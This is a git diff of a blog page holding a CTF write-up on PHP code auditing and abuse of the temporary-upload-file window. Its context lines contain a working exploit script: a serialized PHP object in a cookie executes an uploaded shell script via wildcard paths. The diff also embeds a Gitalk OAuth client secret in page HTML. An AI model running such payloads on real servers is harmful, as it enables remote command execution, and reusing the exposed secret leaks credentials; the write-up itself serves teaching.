@@ -96,19 +96,19 @@ var _hmt = _hmt || [];
 		  </li>
 		  
 		  <li>
-			<a href="/about" title="About me.">
+			<a href="/about" title="Yo, wanna know more bout me huh?">
 			  <i class=""></i>About
 			</a>
 		  </li>
 		  
 		  <li>
-			<a href="/friends" title="My friends.">
+			<a href="/friends" title="Friendship is magic❤">
 			  <i class=""></i>Friends
 			</a>
 		  </li>
 		  
 		  <li>
-			<a href="/atom.xml" title="Subscribe me.">
+			<a href="/atom.xml" title="Subscribe?">
 			  <i class=""></i>RSS
 			</a>
 		  </li>
@@ -132,18 +132,18 @@ var _hmt = _hmt || [];
 
 
 
-<div class="row post">
-	<!-- cols -->
-	
-	<div id="top_meta"></div>
-	<div class="col-md-9">
-	
+    <div class="row post">
+        <!-- cols -->
+        
+            <div id="top_meta"></div>
+            <div class="col-md-9">
+                
 
-	<!-- content -->
-	<div class="mypage">		
-	  		
+                            <!-- content -->
+                            <div class="mypage">
+                                
 
-	  <p>考察php代码审计，临时文件窗口期的利用，以及linux指令的掌握，对我好难，还好有@blackWatch的wp和协助</p>
+                                        <p>考察php代码审计，临时文件窗口期的利用，以及linux指令的掌握，对我好难，还好有@blackWatch的wp和协助</p>
 <p>（据说是某原题搬运，碍于题量太少而没有找到原题在哪，但是这不重要</p>
 <span id="more"></span>
 
@@ -179,12 +179,12 @@ var _hmt = _hmt || [];
 </ul>
 <h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"><span class="comment">#                  echo的快捷用法，但须在php.ini里打开short_open_tag</span></span><br><span class="line"><span class="comment">#                                          |</span></span><br><span class="line"><span class="comment">#                                          |   尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回</span></span><br><span class="line"><span class="comment">#                                          ↓                 ↓</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">git = <span class="string">&#x27;O:6:&quot;github&quot;:1:&#123;s:3:&quot;cmd&quot;;s:26:&quot;?&gt;&lt;?=`. /??p/p?p??????`;?&gt;&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#                                            ↑</span></span><br><span class="line"><span class="comment">#                                     执行后面路径下的文件</span></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"></span><br><span class="line">git = base64.b64encode(git.encode()).decode()</span><br><span class="line">cookies = &#123;<span class="string">&#x27;git&#x27;</span>: git&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"><span class="comment">#                打开根目录下全部文件并显示在标准输出</span></span><br><span class="line"><span class="comment">#                             |</span></span><br><span class="line"><span class="comment">#                             |   查找字符串</span></span><br><span class="line"><span class="comment">#                             ↓      ↓</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="string">&quot;#!/bin/sh\ncat /* | grep flag&quot;</span>&#125;</span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#                 ↑         ↑       ↑</span></span><br><span class="line"><span class="comment">#                 |       换行符   pipe，以前面的返回作为参数来执行后面的命令，相当于在根目录里找flag </span></span><br><span class="line"><span class="comment">#                 |</span></span><br><span class="line"><span class="comment">#      #!是一个特殊的表示符，其后跟着解释此脚本的shell路径</span></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"></span><br><span class="line">a = requests.post(url, files=files, cookies=cookies)</span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure>
 
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>	  
-	</div>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+                            </div>
 
-	<div>
-  	<center>
-	<div class="pagination">
+                            <div>
+                                <center>
+                                    <div class="pagination">
 
     
     
@@ -201,11 +201,11 @@ var _hmt = _hmt || [];
     
 </div>
 
-    </center>
-	</div>
-	
-	<!-- comment -->
-	
+                                </center>
+                            </div>
+
+                            <!-- comment -->
+                            
 <section id="comment">
     <h2 class="title">Comments</h2>
 
@@ -213,11 +213,12 @@ var _hmt = _hmt || [];
 </section>
 
 
-	</div> <!-- col-md-9/col-md-12 -->
-		
-	
-	<div id="side_meta">
-		<div class="col-md-3" id="post_meta"> 
+                    </div>
+                    <!-- col-md-9/col-md-12 -->
+
+                    
+                        <div id="side_meta">
+                            <div class="col-md-3" id="post_meta"> 
 
 	<!-- date -->
 	
@@ -267,13 +268,31 @@ var _hmt = _hmt || [];
 	
 </div><!-- col-md-3 -->
 
-	</div>
-		
+                        </div>
+                        
 
-</div><!-- row -->
+            </div>
+            <!-- row -->
+            
 
 
-
+                
+                    <div id="gitalk-container"></div>
+                    <link rel="stylesheet" href="https://unpkg.com/gitalk@latest/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script type="text/javascript">
+    new Gitalk({
+        clientID: '91155bbf0d150664c4e8',
+        clientSecret: 'a6ace36b45921480fe64e5a8d76de241d197bb15',
+        repo: 'kyriota.github.io',
+        owner: 'Kyriota',
+        admin: 'Kyriota',
+        id: md5(location.pathname),
+        distractionFreeMode: true
+    }).render('gitalk-container')
+</script>
+                        
 	</div>
   </div>
   <div class="container-narrow">
